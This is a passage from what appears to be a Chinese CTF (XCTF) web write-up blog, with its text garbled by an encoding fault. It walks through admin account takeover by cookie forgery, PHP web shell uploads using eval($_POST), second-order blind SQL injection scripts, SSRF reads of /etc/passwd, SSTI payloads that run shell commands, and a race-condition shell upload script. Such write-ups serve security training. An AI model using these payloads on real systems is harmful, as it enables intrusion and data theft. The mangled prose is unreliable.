</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">json1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>bpç”¨postä¼ jsonå°±è¡Œäº†</p>
<h2 id="bug">bug
</h2><p>ä»¥ä¸ºæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œè¯•äº†å¥½å‡ éä¸å¯¹</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·</p>
<p>ç°åœ¨æœ‰ä¸¤ç§åšæ³•</p>
<p>ä¸€ç§åˆ©ç”¨é€»è¾‘æ¼æ´ï¼Œå› ä¸ºç™»å…¥æˆåŠŸä¼šæ˜¾ç¤ºuid</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112052001.png"
	width="504"
	height="174"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112052001_hu14076226741854884391.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112052001_hu5125310401321748394.png 1024w"
	loading="lazy"
	
		alt="image-20250127112052001"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="695px"
	
></p>
<p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250127112112143.png"
	
	
	
	loading="lazy"
	
		alt="image-20250127112112143"
	
	
></p>
<p>æŠ“åŒ…</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112229033.png"
	width="1560"
	height="372"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112229033_hu687885397334976754.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112229033_hu7464072665026486943.png 1024w"
	loading="lazy"
	
		alt="image-20250127112229033"
	
	
		class="gallery-image" 
		data-flex-grow="419"
		data-flex-basis="1006px"
	
></p>
<p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250127112236847.png"
	
	
	
	loading="lazy"
	
		alt="image-20250127112236847"
	
	
></p>
<p>å‘ç°cookieé‡Œé¢userçš„å€¼æ˜¯uidå€¼ï¼šç”¨æˆ·åçš„MD5</p>
<p>æˆ‘ä»¬ç›´æ¥ç”¨1:adminçš„MD5æ›¿æ¢</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112511633.png"
	width="905"
	height="212"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112511633_hu7607727269234429846.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112511633_hu10585356243796196570.png 1024w"
	loading="lazy"
	
		alt="image-20250127112511633"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1024px"
	
></p>
<p>æ‹¿åˆ°å…¶ä»–ä¿¡æ¯æ¥ä¸‹æ¥å°±æ˜¯æ‰¾å›ä¿®æ”¹adminçš„å¯†ç ç™»å…¥å°±è¡Œ</p>
<p>ç¬¬äºŒç§åŠæ³•åˆ©ç”¨æ‰¾å›å¯†ç çš„åŒ…ä¿®æ”¹æˆadminçš„å¯†ç </p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112706570.png"
	width="1485"
	height="497"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112706570_hu13222279945547112654.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112706570_hu4127436758810218909.png 1024w"
	loading="lazy"
	
		alt="image-20250127112706570"
	
	
		class="gallery-image" 
		data-flex-grow="298"
		data-flex-basis="717px"
	
></p>
<p>æ”¹ä¸ºadminï¼Œç™»å…¥æˆåŠŸ</p>
<p>æŸ¥çœ‹message</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112848668.png"
	width="735"
	height="262"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112848668_hu12424810900608279064.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112848668_hu2242015858611813742.png 1024w"
	loading="lazy"
	
		alt="image-20250127112848668"
	
	
		class="gallery-image" 
		data-flex-grow="280"
		data-flex-basis="673px"
	
></p>
<p>è¦æ”¹XFFå¤´äº†</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127113719402.png"
	width="1495"
	height="801"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127113719402_hu13993707329297008914.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127113719402_hu2929809080062322024.png 1024w"
	loading="lazy"
	
		alt="image-20250127113719402"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="447px"
	
></p>
<p>çœ‹åˆ°filemanageæƒ³åˆ°upload</p>
<p>æœç„¶æ˜¯æ–‡ä»¶ä¸Šä¼ ç•Œé¢ï¼Œç›´æ¥ä¸Šä¼ phpæ˜¯ä¸è¡Œçš„ï¼Œæç¤ºjust image</p>
<p>æˆ‘ä»¬è¦æŠŠcontent-typeæ”¹æˆimage/jpeg</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127115017317.png"
	width="529"
	height="166"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127115017317_hu3801462783309944925.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127115017317_hu12176012849245926618.png 1024w"
	loading="lazy"
	
		alt="image-20250127115017317"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="764px"
	
></p>
<p>æµ‹è¯•å‘ç°åªæœ‰php4å’Œphp5èƒ½è¢«è§£ææˆphp</p>
<?phpä¼šè¢«æ£€æµ‹

ç„¶å<?ä¸è¡Œ

æƒ³åˆ°ç”¨`<script language='php'>1</script>`æ¥è¡¨ç¤ºphp

```
<script language='php'>eval($_POST['cmd'])</script>
```

![image-20250127115812952](image-20250127115812952.png)

ä¸Šä¼ æˆåŠŸ

![image-20250127115836007](image-20250127115836007.png)

## ics-07

ä»£ç å®¡è®¡éå¸¸ç®€å•

è¦æ±‚postä¼ conå€¼å’Œfileå€¼,æœ€åæŠŠä¸Šä¼ æ–‡ä»¶ä¿å­˜åˆ°/backupä¸‹ï¼Œåˆä¼šåˆ›å»ºä¸€ä¸ªuploadæ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥æœ€åæ–‡ä»¶åœ¨upload/backupä¸‹ï¼Œç„¶åfileè¿‡æ»¤äº†phpçš„å…¶ä»–ç­‰ä»·æ‹“å±•å

è¿™é‡Œåˆ©ç”¨åˆ°apache2.xçš„è§£ææ¼æ´

ä¼ å…¥shell.php/1.php/..ç”±äº/..æ˜¯è¿”å›çˆ¶ç›®å½•çš„æ„æ€ï¼Œè¿™æ ·å°±ä¼šè§£ææˆshell.php

conä¼ ä¸€å¥è¯

ç„¶ååé¢é‚£ä¸ªfloatvalå‡½æ•°å¼ºæ¯”è¾ƒç”¨1abc9ç»•è¿‡è¿™æ ·æ˜¯å­—ç¬¦ä¸²ä¸”æœ€åä¸€ä½æ˜¯9

ä¸Šä¼ åèšå‰‘è¿æ¥

## unfinish

ç›®å½•æ‰«æ

![image-20250130112350064](image-20250130112350064.png)

å‘ç°register.php

æ³¨å†Œåç™»å…¥å‘ç°index.phpå›æ˜¾ç”¨æˆ·å

ç”±äºé¢˜ç›®æç¤ºsqlï¼Œæ‰€ä»¥æƒ³åˆ°äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨æ³¨å†Œç•Œé¢çš„ç”¨æˆ·åå¤„å­˜åœ¨æ³¨å…¥ç‚¹

bpæŠ“æ³¨å†Œç•Œé¢åŒ…

fuzzæµ‹è¯•

![image-20250130113316020](image-20250130113316020.png)



informationä¹Ÿè¢«è¿‡æ»¤äº†

ä¸‹é¢å°±æ˜¯æ„é€ äºŒæ¬¡æ³¨å…¥è¯­å¥

ç”±äºsqlä¸­+æ˜¯è¿ç®—ç¬¦

å­˜åœ¨äºŒæ¬¡æ³¨å…¥`0'+1+'0`ä¼šå›æ˜¾1

æˆ‘ä»¬åœ¨ä¸¤ä¸ªå¼•å·ç›´æ¥æ’å…¥æŸ¥è¯¢è¯­å¥

```
0'+ascii(substr(database() from 1 for 1)+'0
0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))+'0
è¿™é‡Œçš„flagè¡¨åæ˜¯çŒœçš„ï¼Œå› ä¸ºinformationè¢«è¿‡æ»¤äº†
0â€™+ascii(substr((select * from flag),1,1))+â€˜0
ç”±äºï¼Œä¹Ÿè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨from*for*è¯­å¥ä»£æ›¿
0â€™+ascii(substr((select * from flag) from 1 for 1))+'0
æ¥ä¸‹æ¥å°±æ˜¯ç”¨è„šæœ¬è¿›è¡Œå¸ƒå°”ç›²æ³¨æ¥çˆ†ç ´è¡¨é‡Œçš„æ•°æ®
```

```python
import requests, re


# æ‹¿åˆ°ç™»å½•é¡µé¢çš„urlå’Œæ³¨å†Œé¡µé¢çš„url
login_url = 'http://61.147.171.105:51643/login.php'
register_url = 'http://61.147.171.105:51643/register.php'
flag = ''

# æ¯æ¬¡æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œæ‹¿åˆ°æ•°æ®åº“ä¸­çš„ä¸€ä¸ªå­—ç¬¦
for i in range(1, 100):
    # æ³¨å†Œæ—¶å€™çš„payloadæ•°æ®
    register_data = {
        'email': 'test%d123.com' % i,
        'username': "0' + ascii(substr((select * from flag) from %d for 1)) + '0" % i,
        'password': '123'
    }
    # postæäº¤æ³¨å†Œpayload
    res = requests.post(url=register_url,data=register_data)
    
    # ç™»å½•æ—¶å€™çš„payloadæ•°æ®
    login_data = {
        'email': 'test%d123.com' % i,
        'password': '123'
    }
    # postæäº¤ç™»å½•payload
    res = requests.post(url=login_url, data=login_data)

    # ä½¿ç”¨æ­£åˆ™åŒ¹é…ï¼Œæ‰¾åˆ°å‰ç«¯çš„å›æ˜¾æ•°æ®
    num = re.search('<span class="user-name">\n(.*?)</span>', res.text)
    # å°†æ‹¿åˆ°çš„asciiè½¬ç ï¼Œè¿˜åŸæˆå­˜å‚¨çš„æ•°æ®
    flag += chr(int(num.group(1).strip()))
    print(flag)
```

```
% i  #è¡¨ç¤ºæ¯æ¬¡æ³¨å†Œçš„æ—¶å€™ï¼Œä½¿ç”¨%iå»æ›¿æ¢%dçš„æ•°æ®
.*?æ˜¯éè´ªå©ªæ­£åˆ™åŒ¹é…ï¼Œçˆ¬è™«çš„æ—¶å€™ç”¨çš„
```

![image-20250130114619928](image-20250130114619928.png)

## é¢˜ç›®åç§°-SSRF Me

ssrfæ˜¯æœåŠ¡ç«¯ä¼ªé€ æ”»å‡»

æ‰€ä»¥ä¸Šæ¥çš„urlåœ°å€æˆ‘ä»¬å¯ä»¥ç”¨fileä¼ªåè®®è¯»å–ä»–æœ¬åœ°çš„æ–‡ä»¶

è€Œä¸‹é¢é‚£ä¸ªéªŒè¯ç ï¼Œæˆ‘ä»¬ç”¨è„šæœ¬çˆ†ç ´

```php
<?php
$captcha=0;
while(true)
{
    if(substr(md5($captcha), -6, 6) == "ecf20f")
    {
        echo $captcha;
        break;
    }
    $captcha++;

}
?>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä¸Šé¢å…ˆè¯•ç€è®¿é—®`file:///etc/passwd`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å›æ˜¾
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æˆ‘ä»¬å°è¯•ç›´æ¥è¯»å–flag`flie:///flag`å›æ˜¾hack
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è¯´æ˜æœ‰è¿‡æ»¤ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨urlç¼–ç çš„flagè®¿é—®`file:///%66%6c%61%67`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å‡ºç°flag
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">![image-20250130130436846](image-20250130130436846.png)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">## easy_web
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å°è¯•sqlæ³¨å…¥å‘ç°ä¸è¡Œ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bpæŠ“åŒ…çœ‹æ¡†æ¶æ˜¯pythonï¼Œæƒ³åˆ°SSTI
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä½†æ˜¯æ‰‹åŠ¨æµ‹è¯•äº†ä¸€äº›å­—ç¬¦è¢«è¿‡æ»¤ï¼Œè€Œè¿™é‡Œæ˜¯å­—ç¬¦è§„èŒƒå™¨ï¼Œé€šè¿‡ç‰¹æ®Šå­—ç¬¦æ¥ç»•è¿‡
</span></span></code></pre></td></tr></table>
</div>
</div><p>{ -&gt; ï¸·/ï¹›
} -&gt; ï¸¸/ï¹œ
&rsquo; -&gt; ï¼‡
, -&gt; ï¼Œ
&quot; -&gt; ï¼‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">ç”¨ä¸‡èƒ½</span><span class="n">payloadæ›¿æ¢</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">```</span><span class="n">python</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">a</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;</span><span class="p">)}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ›¿æ¢è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">{ -&gt; ï¸·/ï¹›
</span></span></span><span class="line"><span class="cl"><span class="s2">} -&gt; ï¸¸/ï¹œ
</span></span></span><span class="line"><span class="cl"><span class="s2">&#39; -&gt; ï¼‡
</span></span></span><span class="line"><span class="cl"><span class="s2">, -&gt; ï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34; -&gt; ï¼‚
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">æ­¤æ—¶çš„strå³ä½ è¦è¾“å…¥çš„payload</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;{{a.__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)}}&#39;&#39;&#39;</span> <span class="c1"># åŸå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl"><span class="c1"># å¦‚æœéœ€è¦æ›¿æ¢replace(è¢«æ›¿æ¢çš„å­—ç¬¦,æ›¿æ¢åçš„å­—ç¬¦)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;{&#39;</span><span class="p">,</span> <span class="s1">&#39;ï¸·&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;ï¸¸&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;ï¼‡&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\&#34;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;ï¼‚&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215647111.png"
	width="984"
	height="308"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215647111_hu12398852240813051090.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250130215647111_hu16441723671702758866.png 1024w"
	loading="lazy"
	
		alt="image-20250130215647111"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="766px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215703701.png"
	width="895"
	height="330"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215703701_hu11888995718076819814.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250130215703701_hu14996531949812892576.png 1024w"
	loading="lazy"
	
		alt="image-20250130215703701"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="650px"
	
></p>
<p>æˆ–è€…è€å¥—è·¯å…ˆæŸ¥å­ç±»çš„çˆ¶ç±»ï¼Œæ‰¾æœ‰ç”¨çš„function</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250130221402975.png"
	width="811"
	height="261"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250130221402975_hu3672360069884041939.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250130221402975_hu11965084219701418160.png 1024w"
	loading="lazy"
	
		alt="image-20250130221402975"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="745px"
	
></p>
<p>warningsåœ¨191</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°å¯ä»¥è¯»å‡º,ç›´æ¥è¯»flagå³å¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…ç”¨evalå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[191].__init__.__globals__.__builtins__[&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wzsc_æ–‡ä»¶ä¸Šä¼ ">wzsc_æ–‡ä»¶ä¸Šä¼ 
</h2><p>ä¸Šä¼ phpæ–‡ä»¶ä¼šæ˜¾ç¤ºä¸Šä¼ æˆåŠŸï¼Œè€ŒæŸ¥çœ‹uploadç›®å½•å´æ²¡æœ‰ï¼Œæ€€ç–‘æ˜¯ä¸Šä¼ åå°±åˆ é™¤ï¼Œç”¨æ¡ä»¶ç«äº‰ä¸Šä¼ </p>
<p>æ¡ä»¶ç«äº‰æœ¨é©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]) ?&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åç”¨bpé‡å¤å‘åŒ…</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150017122.png"
	width="1863"
	height="799"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250131150017122_hu5683731617195239960.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250131150017122_hu277031249413303383.png 1024w"
	loading="lazy"
	
		alt="image-20250131150017122"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="559px"
	
></p>
<p>å†ç”¨è„šæœ¬é‡å¤è®¿é—®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RaceCondition</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://61.147.171.105:54711/upload/1.php&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">uploadUrl</span> <span class="o">=</span> <span class="s1">&#39;http://61.147.171.105:54711/upload/shell.php&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_get</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;try to call uploaded file...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] create file shell.php success.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_upload</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;upload file...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">rs</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">uploadUrl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">rs</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] create file shell.php success.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_get</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_upload</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">_get</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">threads</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">RaceCondition</span><span class="p">()</span>
